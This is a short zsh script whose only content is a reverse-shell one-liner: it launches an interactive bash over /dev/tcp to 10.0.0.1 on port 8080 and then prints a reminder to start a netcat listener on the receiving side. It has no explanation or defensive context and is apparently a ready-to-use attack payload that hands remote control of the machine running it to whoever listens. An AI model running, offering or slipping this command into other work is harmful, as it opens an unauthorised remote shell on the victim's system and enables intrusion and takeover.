#!/usr/bin/env zsh



zsh -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

echo 'Now run the command {nc -lvnp [port]}'
